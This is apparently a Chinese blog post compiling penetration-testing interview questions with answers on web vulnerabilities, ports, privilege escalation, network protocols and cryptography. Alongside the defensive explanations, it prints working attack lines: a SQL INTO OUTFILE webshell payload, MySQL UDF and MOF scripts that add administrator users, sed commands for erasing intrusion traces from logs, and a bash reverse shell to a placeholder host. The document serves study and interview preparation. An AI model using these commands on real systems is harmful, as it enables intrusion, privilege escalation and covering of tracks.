Mongodb未授权访问50000 SAP命令执行50070,50030 hadoop默认端口未授权访问 4,常用端口类(扫描弱口令/端口爆破) 1234521 ftp22 SSH23 Telnet2601,2604 zebra路由，默认密码zebra3389 远程桌面 端口合计详情 12345678910111213141516171819202122232425262728293031323334353637383940414221 ftp22 SSH23 Telnet80 web80-89 web161 SNMP389 LDAP443 SSL心脏滴血以及一些web漏洞测试445 SMB512,513,514 Rexec873 Rsync未授权1025,111 NFS1433 MSSQL1521 Oracle:(iSqlPlus Port:5560,7778)2082/2083 cpanel主机管理系统登陆 （国外用较多）2222 DA虚拟主机管理系统登陆 （国外用较多）2601,2604 zebra路由，默认密码zebra3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了3306 MySQL3312/3311 kangle主机管理系统登陆3389 远程桌面4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网5432 PostgreSQL5900 vnc5984 CouchDB http://xxx:5984/_utils/6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网6379 redis未授权7001,7002 WebLogic默认弱口令，反序列7778 Kloxo主机控制面板登录8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上8080 tomcat/WDCP主机管理系统，默认弱口令8080,8089,9090 JBOSS8083 Vestacp主机管理系统 （国外用较多）8649 ganglia8888 amh/LuManager 主机管理系统默认端口9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞10000 Virtualmin/Webmin 服务器虚拟主机管理系统11211 memcache未授权访问27017,27018 Mongodb未授权访问28017 mongodb统计页面50000 SAP命令执行50070,50030 hadoop默认端口未授权访问 深信服一面: 了解哪些漏洞 文件上传有哪些防护方式 用什么扫描端口，目录 如何判断注入 注入有防护怎么办 有没有写过tamper 3306 1443 8080是什么端口 计算机网络从物理层到应用层xxxx 有没有web服务开发经验 如何向服务器写入webshell 有没有用过xss平台 网站渗透的流程 mysql两种提权方式（udf，？） 常见加密方式xxx ddos如何防护 有没有抓过包，会不会写wireshark过滤规则 清理日志要清理哪些 SQL注入防护1、使用安全的API 2、对输入的特殊字符进行Escape转义处理 3、使用白名单来规范化输入验证方法 4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符 5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。 6、规范编码,字符集 为什么参数化查询可以防止sql注入原理: 使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行 简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑。 SQL头注入点1234UAREFERERCOOKIEIP 盲注是什么？怎么盲注？盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。 宽字节注入产生原理以及根本原因产生原理在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0xBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\\转义符号会被前面的bf带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。 在哪里编码根本原因character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。 解决办法统一数据库、Web应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。或对数据进行正确的转义，如mysql_real_escape_string+mysql_set_charset的使用。 sql里面只有update怎么利用先理解这句 SQL 1UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id' 如果此 SQL 被修改成以下形式，就实现了注入 1：修改 homepage 值为http://xxx.net', userlevel='3 之后 SQL 语句变为 1UPDATE user SET password='mypass', homepage='http://xxx.net', userlevel='3' WHERE id='$id' userlevel 为用户级别 2:修改 password 值为mypass)' WHERE username='admin'# 之后 SQL 语句变为 1UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id' 3：修改 id 值为' OR username='admin' 之后 SQL 语句变为 1UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin' sql如何写shell/单引号被过滤怎么办写shell: root权限，GPC关闭，知道文件路径 outfile函数 123`http://127.0.0.1:81/sqli.php?id=1 into outfile 'C:\\\\wamp64\\\\www\\\\phpinfo.php' FIELDS TERMINATED BY '&lt;?php phpinfo(); ?&gt;'``http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile 'C:\\\\wamp64\\\\www\\\\phpinfo.php'` 被过滤的话，尝试宽字节注入 代替空格的方法 %0a、%0b、%a0 等 /**/ 等注释符 &lt;&gt; mysql的网站注入，5.0以上和5.0以下有什么区别？ 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。 5.0以下是多用户单操作，5.0以上是多用户多操做。 XSSXSS原理反射型用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。需要诱使用户“点击”一个恶意链接，才能攻击成功 储存型存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。 DOM型通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。 DOM型和反射型的区别反射型XSS：通过诱导用户点击，我们构造好的恶意payload才会触发的XSS。反射型XSS的检测我们在每次请求带payload的链接时页面应该是会带有特定的畸形数据的。DOM型：通过修改页面的DOM节点形成的XSS。DOM-based XSS由于是通过js代码进行dom操作产生的XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。根本区别在我看来是输出点的不同。 DOM型XSS 自动化测试或人工测试人工测试思路：找到类似document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个javascript解析器，否则会漏掉一些通过js执行带入的部分内容。 在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的XSS检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。。。 如何快速发现xss位置对于XSS怎么修补建议输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。 输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Javascript脚本中时，对其进行JavascriptEncode。对使用JavascriptEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Javascript的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。 除此之外，还有做HTTPOnly对Cookie劫持做限制。 XSS蠕虫的产生条件正常情况下，一个是产生XSS点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生。不一定需要存储型XSS CSRFCSRF原理CSRF是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发起的确认 防御 验证Referer 添加token token和referer做横向对比，谁安全等级高？token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。但是token的话，要保证其足够随机且不可泄露。(不可预测性原则) 对referer的验证，从什么角度去做？如果做，怎么杜绝问题对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？引用一段请教前辈的回答： 1234针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击信息泄露有可能是缓存、日志、get，也有可能是利用跨站很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过比如抢红包业务之类的 SSRFSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 检测SSRF漏洞的验证方法： 1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞 2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞 4 SSRF漏洞的成因 防御 绕过成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻击。防御：禁止跳转，限制协议，内外网限制，URL限制。绕过：使用不同协议，针对IP，IP格式的绕过，针对URL，恶意URL增添其他字符，@之类的。301跳转+dns rebindding。 上传文件上传漏洞原理由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件 常见的上传绕过方式 前端js验证：禁用js/burp改包 大小写 双重后缀名 过滤绕过 pphphp-&gt;php 防护 文件上传目录设置为不可执行 使用白名单判断文件上传类型 用随机数改写文件名和路径 审查上传点的元素有什么意义？有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 文件包含原理引入一段用户能控制的脚本或代码，并让服务器端执行 （1）include()等函数通过动态变量的方式引入需要包含的文件；（2）用户能够控制该动态变量。 导致文件包含的函数PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), … JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), … ASP：include file, include virtual, 本地文件包含能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞 XXE逻辑漏洞金融行业常见逻辑漏洞单针对金融业务的 主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易/订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。 溢出中间人攻击中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞 防御中间人攻击的方案通常基于一下几种技术 1.公钥基础建设PKI 使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证 2.延迟测试 使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。 3.使用其他形式的密钥交换形式 ARP欺骗原理:每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能 防护1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC 2.在网关绑定主机MAC与IP地址 3.使用ARP防火墙 DDOSDdos原理利用合理的请求造成资源过载，导致服务不可用 syn洪流的原理伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。 CC攻击原理对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。 DDOS防护SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。 提权mysql两种提权方式udf提权,mof提权 Mysql_UDF提权要求: 1.目标系统是Windows(Win2000,XP,Win2003)； 2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\\plugin文件夹下才能创建自定义函数 可以在mysql里输入 select @@basedir show variables like ‘%plugins%’ 寻找mysql安装路径 提权:使用SQL语句创建功能函数。 语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’； 12345create function cmdshell returns string soname ‘udf.dll’select cmdshell(‘net user arsch arsch /add’);select cmdshell(‘net localgroup administrators arsch /add’);drop function cmdshell; 该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\\plugin文件夹，然后将udf.dll文件导出到该目录即可。 Mysql mof提权12345678910111213141516171819202122232425#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;)instance of __EventFilter as $EventFilter{EventNamespace = &quot;Root\\\\Cimv2&quot;;Name = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;};instance of ActiveScriptEventConsumer as $Consumer{Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user waitalone waitalone.cn /add\\&quot;)&quot;;};instance of __FilterToConsumerBinding{Consumer = $Consumer;Filter = $EventFilter;}; 其中的第18行的命令，上传前请自己更改。 2、执行load_file及into dumpfile把文件导出到正确的位置即可。 1select load file('c:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mov' 执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。 特殊漏洞Struts2-045Redis未授权访问产生原因Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器 利用条件和方法条件: redis服务以root账户运行 redis无密码或弱密码进行认证 redis监听在0.0.0.0公网上 方法: 通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫 上传SSH公钥获得SSH登录权限 通过crontab反弹shell slave主从模式利用 修复 密码验证 降权运行 限制ip/修改端口 Jenkins未授权访问攻击者通过未授权访问进入脚本命令执行界面执行攻击指令 println &quot;ifconfig -a&quot;.execute().text 执行一些系统命令,利用wget下载webshell MongoDB未授权访问开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。 防护1、为MongoDB添加认证： ​ 1)MongoDB启动时添加–auth参数 ​ 2)给MongoDB添加用户：use admin #使用admin库 db.addUser(“root”, “123456”) #添加用户名root密码123456的用户 db.auth(“root”,“123456”) #验证下是否添加成功，返回1说明成功 2、禁用HTTP和REST端口 MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false 3、限制绑定IP 启动时加入参数 –bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1 Memcache未授权访问Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。 利用1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。 2、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在 漏洞加固 1、设置memchached只允许本地访问 2、禁止外网访问Memcached 11211端口 3、编译时加上–enable-sasl，启用SASL认证 FFMPEG 本地文件读取漏洞原理通过调用加密API将payload加密放入一个会被执行的段字节中。但是具体回答工程中我只回答道了SSRF老洞，m3u8头，偏移量，加密。 安全知识WEB常用WEB开发JAVA框架STRUTS,SPRING 常见的java框架漏洞 其实面试官问这个问题的时候我不太清楚他要问什么，我提到struts的045 048，java常见反序列化。 045 错误处理引入了ognl表达式 048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式 反序列化 操作对象，通过手段引入。apache common的反射机制、readobject的重写，其实具体的我也记不清楚。。。然后这部分就结束了 同源策略同源策略限制不同源对当前document的属性内容进行读取或设置。不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。 Jsonp安全攻防技术，怎么写Jsonp的攻击页面？涉及到Jsonp的安全攻防内容JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。 攻击页面JSON劫持，跨域劫持敏感信息，页面类似于 12345function wooyun(v){alert(v.username);}&lt;/script&gt;&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt; Content-type不正确情况下，JSONP和Callback内容可定义可造成XSS。JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。 PHPphp中命令执行涉及到的函数1，代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function() 2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等 3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() 安全模式下绕过php的disable fuctionDL函数，组件漏洞，环境变量。 PHP弱类型 == 在进行比较的时候，会先将字符串类型转化成相同，再比较 如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 0e开头的字符串等于0 数据库各种数据库文件存放的位置mysql:/usr/local/mysql/data/ C:\\ProgramData\\MySQL\\MySQL Server 5.6\\Data\\ oracle:$ORACLE_BASE/oradata/$ORACLE_SID/ 系统如何清理日志meterpreter: clearev 入侵 Linux 服务器后需要清除哪些日志？web日志，如apache的access.log,error.log。直接将日志清除过于明显,一般使用sed进行定向清除 e.g. sed -i -e ‘/192.169.1.1/d’ history命令的清除，也是对~/.bash_history进行定向清除 wtmp日志的清除，/var/log/wtmp 登录日志清除 /var/log/secure LINUX查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点1netstat -antp` `ss -l ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。 反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?1bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1 通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？1ls /proc 系统信息，硬件信息，内核版本，加载的模块，进程 linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。/etc/ssh/sshd___config iptables配置 如何一条命令查看文件内容最后一百行1tail -n 100 filename Windows如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。密码学AES／DES的具体工作步骤RSA算法加密: $$ 密文＝明文^EmodN $$ RSA加密是对明文的E次方后除以N后求余数的过程 $$ 公钥＝(E,N) $$ 解密: $$ 明文＝密文^DmodN $$ $$ 私钥＝(D,N) $$ 三个参数n,e1,e2 n是两个大质数p,q的积 分组密码的加密模式如何生成一个安全的随机数？引用之前一个学长的答案，可以通过一些物理系统生成随机数，如电压的波动、磁盘磁头读/写时的寻道时间、空中电磁波的噪声等。 SSL握手过程建立TCP连接、客户端发送SSL请求、服务端处理SSL请求、客户端发送公共密钥加密过的随机数据、服务端用私有密钥解密加密后的随机数据并协商暗号、服务端跟客户端利用暗号生成加密算法跟密钥key、之后正常通信。这部分本来是忘了的，但是之前看SSL Pinning的时候好像记了张图在脑子里，挣扎半天还是没敢确定，遂放弃。。。 对称加密与非对称加密的不同，分别用在哪些方面TCP/IPTCP三次握手的过程以及对应的状态转换（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。 TCP和UDP协议区别tcp面向连接,udp面向报文 tcp对系统资源的要求多 udp结构简单 tcp保证数据完整性和顺序，udp不保证 https的建立过程 客户端发送请求到服务器端 服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在 客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端 服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端 客户端使用共享密钥解密数据 SSL加密建立 流量分析wireshark简单的过滤规则过滤ip: 过滤源ip地址:ip.src==1.1.1.1;,目的ip地址:ip.dst==1.1.1.1; 过滤端口: 过滤80端口:tcp.port==80,源端口:tcp.srcport==80,目的端口:tcp.dstport==80 协议过滤: 直接输入协议名即可,如http协议http http模式过滤: 过滤get/post包http.request.mothod==&quot;GET/POST&quot; 防火墙简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。转自：https://github.com/Mr-xn/BurpSuite-collections/blob/master/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md","link":"/2019/10/17/web%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%A2%98%E5%9F%BA%E7%A1%80%E7%89%882019/"}],"tags":[{"name":"web渗透","slug":"web渗透","link":"/tags/web%E6%B8%97%E9%80%8F/"},{"name":"ssrf","slug":"ssrf","link":"/tags/ssrf/"},{"name":"mimikatz","slug":"mimikatz","link":"/tags/mimikatz/"},{"name":"破解","slug":"破解","link":"/tags/%E7%A0%B4%E8%A7%A3/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"Redis","slug":"Redis","link":"/tags/Redis/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"SpringBoot","slug":"SpringBoot","link":"/tags/SpringBoot/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"子系统","slug":"子系统","link":"/tags/%E5%AD%90%E7%B3%BB%E7%BB%9F/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"未授权访问","slug":"未授权访问","link":"/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"xposed","slug":"xposed","link":"/tags/xposed/"},{"name":"提权","slug":"提权","link":"/tags/%E6%8F%90%E6%9D%83/"},{"name":"人生感悟","slug":"人生感悟","link":"/tags/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"},{"name":"服务器原理","slug":"服务器原理","link":"/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"渗透","slug":"渗透","link":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"Mac","slug":"Mac","link":"/tags/Mac/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"ThinkCMF","slug":"ThinkCMF","link":"/tags/ThinkCMF/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"后门","slug":"后门","link":"/tags/%E5%90%8E%E9%97%A8/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"绕waf","slug":"绕waf","link":"/tags/%E7%BB%95waf/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"泛微OA","slug":"泛微OA","link":"/tags/%E6%B3%9B%E5%BE%AEOA/"},{"name":"0day","slug":"0day","link":"/tags/0day/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"JAVA","slug":"JAVA","link":"/tags/JAVA/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"免杀","slug":"免杀","link":"/tags/%E5%85%8D%E6%9D%80/"},{"name":"面试","slug":"面试","link":"/tags/%E9%9D%A2%E8%AF%95/"}],"categories":[{"name":"web渗透","slug":"web渗透","link":"/categories/web%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","link":"/categories/%E6%8F%90%E6%9D%83/"},{"name":"绕过","slug":"绕过","link":"/categories/%E7%BB%95%E8%BF%87/"},{"name":"渗透测试","slug":"渗透测试","link":"/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"windows","slug":"windows","link":"/categories/windows/"},{"name":"漏洞复现","slug":"recurrent","link":"/categories/recurrent/"},{"name":"SpringBoot","slug":"SpringBoot","link":"/categories/SpringBoot/"},{"name":"hexo","slug":"hexo","link":"/categories/hexo/"},{"name":"人生感悟","slug":"人生感悟","link":"/categories/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"},{"name":"SQL注入","slug":"SQL注入","link":"/categories/SQL%E6%B3%A8%E5%85%A5/"},{"name":"服务器原理","slug":"服务器原理","link":"/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"},{"name":"博客搭建进阶","slug":"博客搭建进阶","link":"/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%9B%E9%98%B6/"},{"name":"linux","slug":"linux","link":"/categories/linux/"},{"name":"Mac","slug":"Mac","link":"/categories/Mac/"},{"name":"问题汇总","slug":"问题汇总","link":"/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"},{"name":"python","slug":"python","link":"/categories/python/"},{"name":"文件上传","slug":"文件上传","link":"/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"Android","slug":"Android","link":"/categories/Android/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","link":"/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"XSS","slug":"XSS","link":"/categories/XSS/"},{"name":"面试","slug":"面试","link":"/categories/%E9%9D%A2%E8%AF%95/"}]}